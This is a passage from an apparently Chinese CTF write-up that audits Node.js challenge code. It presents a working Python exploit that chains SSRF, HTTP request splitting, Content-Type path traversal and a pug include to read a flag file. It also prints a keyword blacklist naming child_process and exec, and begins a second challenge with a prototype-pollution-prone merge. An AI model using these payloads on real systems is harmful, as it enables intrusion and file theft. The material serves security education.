class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> app = express();<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> pug = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;pug&#x27;</span>);<br><span class="hljs-keyword">var</span> morgan = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;morgan&#x27;</span>);<br><span class="hljs-keyword">const</span> multer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;multer&#x27;</span>);<br><br><br>app.use(multer(&#123;<span class="hljs-attr">dest</span>: <span class="hljs-string">&#x27;./dist&#x27;</span>&#125;).array(<span class="hljs-string">&#x27;file&#x27;</span>));<br>app.use(morgan(<span class="hljs-string">&#x27;short&#x27;</span>));<br>app.use(<span class="hljs-string">&quot;/uploads&quot;</span>,express.static(path.join(__dirname, <span class="hljs-string">&#x27;/uploads&#x27;</span>)))<br>app.use(<span class="hljs-string">&quot;/template&quot;</span>,express.static(path.join(__dirname, <span class="hljs-string">&#x27;/template&#x27;</span>)))<br><br><br>app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> action = req.query.action?req.query.action:<span class="hljs-string">&quot;index&quot;</span>;<br>    <span class="hljs-keyword">if</span>( action.includes(<span class="hljs-string">&quot;/&quot;</span>) || action.includes(<span class="hljs-string">&quot;\\&quot;</span>) )&#123;<br>        res.send(<span class="hljs-string">&quot;Errrrr, You have been Blocked&quot;</span>);<br>    &#125;<br>    file = path.join(__dirname + <span class="hljs-string">&#x27;/template/&#x27;</span>+ action +<span class="hljs-string">&#x27;.pug&#x27;</span>);<br>    <span class="hljs-keyword">var</span> html = pug.renderFile(file);<br>    res.send(html);<br>&#125;);<br><br>app.post(<span class="hljs-string">&#x27;/file_upload&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;<br>    <span class="hljs-keyword">var</span> ip = req.connection.remoteAddress;<br>    <span class="hljs-keyword">var</span> obj = &#123;<br>        msg: <span class="hljs-string">&#x27;&#x27;</span>,<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!ip.includes(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)) &#123;<br>        obj.msg=<span class="hljs-string">&quot;only admin&#x27;s ip can use it&quot;</span><br>        res.send(<span class="hljs-built_in">JSON</span>.stringify(obj));<br>        <span class="hljs-keyword">return</span> <br>    &#125;<br>    fs.readFile(req.files[<span class="hljs-number">0</span>].path, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, data</span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(err)&#123;<br>            obj.msg = <span class="hljs-string">&#x27;upload failed&#x27;</span>;<br>            res.send(<span class="hljs-built_in">JSON</span>.stringify(obj));<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">var</span> file_path = <span class="hljs-string">&#x27;/uploads/&#x27;</span> + req.files[<span class="hljs-number">0</span>].mimetype +<span class="hljs-string">&quot;/&quot;</span>;<br>            <span class="hljs-keyword">var</span> file_name = req.files[<span class="hljs-number">0</span>].originalname<br>            <span class="hljs-keyword">var</span> dir_file = __dirname + file_path + file_name<br>            <span class="hljs-keyword">if</span>(!fs.existsSync(__dirname + file_path))&#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    fs.mkdirSync(__dirname + file_path)<br>                &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                    obj.msg = <span class="hljs-string">&quot;file type error&quot;</span>;<br>                    res.send(<span class="hljs-built_in">JSON</span>.stringify(obj));<br>                    <span class="hljs-keyword">return</span><br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">try</span> &#123;<br>                fs.writeFileSync(dir_file,data)<br>                obj = &#123;<br>                    msg: <span class="hljs-string">&#x27;upload success&#x27;</span>,<br>                    filename: file_path + file_name<br>                &#125; <br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                obj.msg = <span class="hljs-string">&#x27;upload failed&#x27;</span>;<br>            &#125;<br>            res.send(<span class="hljs-built_in">JSON</span>.stringify(obj));    <br>        &#125;<br>    &#125;)<br>&#125;)<br><br>app.get(<span class="hljs-string">&#x27;/source&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>    res.sendFile(path.join(__dirname + <span class="hljs-string">&#x27;/template/source.txt&#x27;</span>));<br>&#125;);<br><br><br>app.get(<span class="hljs-string">&#x27;/core&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> q = req.query.q;<br>    <span class="hljs-keyword">var</span> resp = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span> (q) &#123;<br>        <span class="hljs-keyword">var</span> url = <span class="hljs-string">&#x27;http://localhost:8081/source?&#x27;</span> + q<br>        <span class="hljs-built_in">console</span>.log(url)<br>        <span class="hljs-keyword">var</span> trigger = blacklist(url);<br>        <span class="hljs-keyword">if</span> (trigger === <span class="hljs-literal">true</span>) &#123;<br>            res.send(<span class="hljs-string">&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                http.get(url, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">resp</span>) </span>&#123;<br>                    resp.setEncoding(<span class="hljs-string">&#x27;utf8&#x27;</span>);<br>                    resp.on(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err</span>) </span>&#123;<br>                    <span class="hljs-keyword">if</span> (err.code === <span class="hljs-string">&quot;ECONNRESET&quot;</span>) &#123;<br>                     <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Timeout occurs&quot;</span>);<br>                     <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                   &#125;);<br><br>                    resp.on(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">chunk</span>) </span>&#123;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                         resps = chunk.toString();<br>                         res.send(resps);<br>                        &#125;<span class="hljs-keyword">catch</span> (e) &#123;<br>                           res.send(e.message);<br>                        &#125;<br> <br>                    &#125;).on(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>                         res.send(e.message);&#125;);<br>                &#125;);<br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                <span class="hljs-built_in">console</span>.log(error);<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.send(<span class="hljs-string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);<br>    &#125;<br>&#125;)<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params">url</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> evilwords = [<span class="hljs-string">&quot;global&quot;</span>, <span class="hljs-string">&quot;process&quot;</span>,<span class="hljs-string">&quot;mainModule&quot;</span>,<span class="hljs-string">&quot;require&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;child_process&quot;</span>,<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;!&quot;</span>];<br>    <span class="hljs-keyword">var</span> arrayLen = evilwords.length;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; arrayLen; i++) &#123;<br>        <span class="hljs-keyword">const</span> trigger = url.includes(evilwords[i]);<br>        <span class="hljs-keyword">if</span> (trigger === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> server = app.listen(<span class="hljs-number">8081</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> host = server.address().address<br>    <span class="hljs-keyword">var</span> port = server.address().port<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Example app listening at http://%s:%s&quot;</span>, host, port)<br>&#125;)<br></code></pre></td></tr></table></figure><p>通过审计发现存在以下功能：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-string">&#x27;/&#x27;</span><span class="hljs-comment"> //index</span><br><span class="hljs-built_in">post</span> /file_upload<span class="hljs-comment"> //文件上传</span><br><span class="hljs-built_in">get</span> /source<span class="hljs-comment"> //查看源码</span><br><span class="hljs-built_in">get</span> /core<span class="hljs-comment"> //存在SSRF</span><br></code></pre></td></tr></table></figure><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>核心代码分析：</p><p>get /core 存在SSRF，对我们传入的q参数进行拼接：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span> = <span class="hljs-string">&#x27;http://localhost:8081/source?&#x27;</span> + q<br></code></pre></td></tr></table></figure><p>然后通过<code>blacklist</code>函数进行验证，<code>blacklist</code>函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params">url</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> evilwords = [<span class="hljs-string">&quot;global&quot;</span>, <span class="hljs-string">&quot;process&quot;</span>,<span class="hljs-string">&quot;mainModule&quot;</span>,<span class="hljs-string">&quot;require&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;child_process&quot;</span>,<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;!&quot;</span>];<br>    <span class="hljs-keyword">var</span> arrayLen = evilwords.length;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; arrayLen; i++) &#123;<br>        <span class="hljs-keyword">const</span> trigger = url.includes(evilwords[i]);<br>        <span class="hljs-keyword">if</span> (trigger === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对敏感函数进行了过滤。</p><p>post /file_upload 是个文件上传的地方，需要满足以下条件：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">ip.<span class="hljs-keyword">includes</span>(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)<br></code></pre></td></tr></table></figure><p>首页还存在提示：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417203837.png" alt="image-20210417203836999"></p><p>存在SSRF+nodejs 想到了http拆分攻击，Node 版本为 8.12.0，存在漏洞，因此可以利用上传功能。</p><p>提示了pug，同时模板渲染采用的是pug引擎：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417204312.png" alt="image-20210417204312204"></p><p>看一下<a href="https://pugjs.org/zh-cn/language/includes.html"> pug 引擎文档：</a></p><p>从代码可以看到存在一个/template模板目录，存放着后缀为pug的模板文件，看下文档里边的包含语法，那么我们可以上传一个pug文件，pug文件里写入恶意的包含代码，包含我们要读的文件，在模板渲染的时候就会包含目标文件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//- index.pug</span><br>doctype html<br>html<br>  head<br>    style<br>      include style.css<br>      <br></code></pre></td></tr></table></figure><p>思路就很明显了，因为限制了本地上传我们利用nodejs 的SSRF构造一个post请求，上传pug文件，包含读取任意文件。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>构造post请求，采用抓包的方法获取上传请求：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417205203.png" alt="image-20210417205203592"></p><p>直接上传会提示：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417205422.png" alt="image-20210417205421796"></p><p>构造exp：利用nodejs ssrf构造post请求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#-*-coding:utf-8</span><br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br><br>payload = <span class="hljs-string">&#x27;&#x27;&#x27; HTTP/1.1</span><br><span class="hljs-string">Host: x</span><br><span class="hljs-string">Connection: keep-alive</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">POST /file_upload HTTP/1.1</span><br><span class="hljs-string">Host: x</span><br><span class="hljs-string">Connection: keep-alive</span><br><span class="hljs-string">Content-Type: multipart/form-data; boundary=---------------------------303312354614442</span><br><span class="hljs-string">Content-Length: 317</span><br><span class="hljs-string"></span><br><span class="hljs-string">-----------------------------303312354614442</span><br><span class="hljs-string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;v1sun.pug&quot;</span><br><span class="hljs-string">Content-Type: /../template</span><br><span class="hljs-string"></span><br><span class="hljs-string">//- v1sun.pug</span><br><span class="hljs-string">doctype html</span><br><span class="hljs-string">html</span><br><span class="hljs-string">  head</span><br><span class="hljs-string">    style</span><br><span class="hljs-string">      include ../../../../../../../../../../../../flag.txt</span><br><span class="hljs-string">      </span><br><span class="hljs-string">-----------------------------303312354614442--</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">GET /flag HTTP/1.1</span><br><span class="hljs-string">Host: x</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">x:&#x27;&#x27;&#x27;</span><br><br>payload = payload.replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;\r\n&quot;</span>)<br>payload = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0xff&#x27;</span> + <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> payload)<br><span class="hljs-comment">#print(payload)</span><br><span class="hljs-comment">#print (urllib.parse.quote(payload))</span><br><br>r = requests.get(<span class="hljs-string">&#x27;http://1b1aa7a2-6ecd-4a57-b9de-5bbebae5c2a0.node3.buuoj.cn/core?q=&#x27;</span>+ urllib.parse.quote(payload))<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p><code>Content-Type</code>处存在一个小trick，利用nodejs的目录穿越，上传到模板目录：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417211406.png" alt="image-20210417211406073"></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">Content-Type: <span class="hljs-regexp">/../</span>template<br></code></pre></td></tr></table></figure><p>同时要修改：<code>Connection: keep-alive</code> 以至于让我们的所有请求包含进去</p><p>上传后访问：<code>?action=v1sun</code> 查看源码就得到flag</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417210638.png" alt="image-20210417210637714"></p><h3 id="WEB-Ez-Express"><a href="#WEB-Ez-Express" class="headerlink" title="[WEB]Ez_Express"></a>[WEB]Ez_Express</h3><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404212051710.png" alt="image-20210404212051710"></p><p>但是ADMIN注册不了，利用TEST注册登录后查看源码：TEST 123456</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404212126997.png" alt="image-20210404212126997"></p><p>下载源码</p><h4 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h4><p>审计发现是nodejs：app.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> createError = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http-errors&#x27;</span>);<br><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">var</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);<br><span class="hljs-keyword">var</span> logger = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;morgan&#x27;</span>);<br><span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>)<br><span class="hljs-keyword">const</span> randomize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;randomatic&#x27;</span>)<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><br><span class="hljs-keyword">var</span> indexRouter = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./routes/index&#x27;</span>);<br><br><span class="hljs-keyword">var</span> app = express();<br><br><span class="hljs-comment">// view engine setup</span><br>app.set(<span class="hljs-string">&#x27;views&#x27;</span>, path.join(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));<br>app.set(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br>app.disable(<span class="hljs-string">&#x27;etag&#x27;</span>);<br>app.use(bodyParser.urlencoded(&#123;<span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span>&#125;)).use(bodyParser.json())<br>app.use(session(&#123;<br>    name: <span class="hljs-string">&#x27;session&#x27;</span>,<br>    secret: randomize(<span class="hljs-string">&#x27;aA0&#x27;</span>, <span class="hljs-number">16</span>),<br>    resave: <span class="hljs-literal">false</span>,<br>    saveUninitialized: <span class="hljs-literal">false</span><br>&#125;))<br>app.use(logger(<span class="hljs-string">&#x27;dev&#x27;</span>));<br>app.use(express.json());<br>app.use(express.urlencoded(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));<br>app.use(cookieParser());<br>app.use(express.static(path.join(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));<br><br>app.use(<span class="hljs-string">&#x27;/&#x27;</span>, indexRouter);<br><br><span class="hljs-comment">// catch 404 and forward to error handler</span><br>app.use(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  next(createError(<span class="hljs-number">404</span>));<br>&#125;);<br><br><span class="hljs-comment">// error handler</span><br>app.use(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, req, res, next</span>) </span>&#123;<br>  <span class="hljs-comment">// set locals, only providing error in development</span><br>  res.locals.message = err.message;<br>  res.locals.error = req.app.get(<span class="hljs-string">&#x27;env&#x27;</span>) === <span class="hljs-string">&#x27;development&#x27;</span> ? err : &#123;&#125;;<br><br>  <span class="hljs-comment">// render the error page</span><br>  res.status(err.status || <span class="hljs-number">500</span>);<br>  res.render(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;);<br><br><span class="hljs-built_in">module</span>.exports = app;<br><br></code></pre></td></tr></table></figure><p>app.js没什么特别关注的点。</p><p>index.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><span class="hljs-keyword">const</span> isObject = <span class="hljs-function"><span class="hljs-params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="hljs-built_in">Object</span>;<br><span class="hljs-keyword">const</span> merge = <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> attr <span class="hljs-keyword">in</span> b) &#123;<br>    <span class="hljs-keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;<br>      merge(a[attr], b[attr]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      a[attr] = b[attr];<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> a<br>&#125;<br><span class="hljs-keyword">const</span> clone = <span class="hljs-function">(<span class="hljs-params">a</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">return</span> merge(&#123;&#125;, a);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safeKeyword</span>(<span class="hljs-params">keyword</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(keyword.match(<span class="hljs-regexp">/(admin)/i</span>s)) &#123;<br>      <span class="hljs-keyword">return</span> keyword<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span><br>&#125;<br><br>router.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(!req.session.user)&#123;<br>    res.redirect(<span class="hljs-string">&#x27;/login&#x27;</span>);<br>  &#125;<br>  res.outputFunctionName=<span class="hljs-literal">undefined</span>;<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:req.session.user.user&#125;);<br>&#125;);<br><br><br>router.get(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  res.render(<span class="hljs-string">&#x27;login&#x27;</span>);<br>&#125;);<br><br><br><br>router.post(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(req.body.Submit==<span class="hljs-string">&quot;register&quot;</span>)&#123;<br>   <span class="hljs-keyword">if</span>(safeKeyword(req.body.userid))&#123;<br>    res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) <br>   &#125;<br>    req.session.user=&#123;<br>      <span class="hljs-string">&#x27;user&#x27;</span>:req.body.userid.toUpperCase(),<br>      <span class="hljs-string">&#x27;passwd&#x27;</span>: req.body.pwd,<br>      <span class="hljs-string">&#x27;isLogin&#x27;</span>:<span class="hljs-literal">false</span><br>    &#125;<br>    res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>); <br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(req.body.Submit==<span class="hljs-string">&quot;login&quot;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!req.session.user)&#123;res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;<br>    <span class="hljs-keyword">if</span>(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;<br>      req.session.user.isLogin=<span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>      res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)<br>    &#125;<br>  <br>  &#125;<br>  res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>); ;<br>&#125;);<br>router.post(<span class="hljs-string">&#x27;/action&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(req.session.user.user!=<span class="hljs-string">&quot;ADMIN&quot;</span>)&#123;res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; <br>  req.session.user.data = clone(req.body);<br>  res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>); 